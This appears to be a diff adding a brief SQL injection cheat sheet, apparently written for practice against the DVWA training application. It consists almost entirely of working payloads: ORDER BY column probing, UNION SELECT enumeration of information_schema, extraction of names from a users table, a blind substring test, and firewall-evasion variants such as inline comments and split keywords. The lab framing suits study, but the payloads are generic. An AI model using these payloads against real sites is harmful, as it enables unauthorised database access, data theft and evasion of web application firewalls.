@@ -1,0 +1,39 @@
+
+?id=5' order by 1~10 --+
+=======================================================================
+ TABLE_SCHEMA       | TABLE_NAME           | COLUMN_NAME
+ ======================================================================
+ tables names inside the database:
+ 
+?id=5' UNION select 1, group_concat(table_name) from information_schema.tables where table_schema='dvwa';--+
+
+=======================================================================
+information in every table:
+
+?id=5' UNION select 1, group_concat(column_name) from information_schema.columns where table_name='users';--+
+
+=======================================================================
+now we compromize all information in the coulumns we found:
+
+?id=5' UNION select first_name,last_name from users;--+
+
+=======================================================================
+blind sql injection database compromize:
+
+?id=5' and substring(database(),1,1)='d';--+
+
+=======================================================================
+Evasion techniques and firewall bypassing:
+
+' or 1=1 -- 
+' or 1=1 --+
+' or 2>1 --+
+' or 'abood'>'a'
+'/*!12345order*/by 5#
+ url encode, hex etc....
+ EXEC('SELE'+'CT')
+ "UNION         SELECT"
+ '/**/or/**/1/**/ = /**/1/**/
+ variables
+ string manipulation
+ 
